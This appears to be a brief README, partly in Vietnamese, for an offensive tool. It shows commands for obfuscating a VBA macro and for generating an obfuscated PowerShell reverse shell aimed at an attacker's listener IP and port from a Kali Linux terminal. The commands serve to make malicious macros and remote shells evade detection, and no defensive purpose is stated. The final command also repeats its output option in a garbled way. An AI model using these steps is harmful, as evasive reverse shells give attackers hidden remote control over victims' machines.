# Obfuscate vba_macro
Dùng lệnh này để obfuscate 
```shell
python.exe obfuscate.py origin.vba output.vba
```
# Obfuscate reverse shell
```shell
┌──(kali㉿kali)-[~/Get-ReverseShell]
└─$ pwsh
┌──(kali㉿kali)-[/home/kali/Get-ReverseShell]
└─PS> Import-Module ./get-reverseshell.ps1
┌──(kali㉿kali)-[/home/kali/Get-ReverseShell]
└─PS> Get-ReverseShell -Ip ListenhostIP -Port ListenPort -Cmdlets -NamespaceClasses -Variables -OutFile obfuscated.ps1-OutFile obfuscated.ps1
```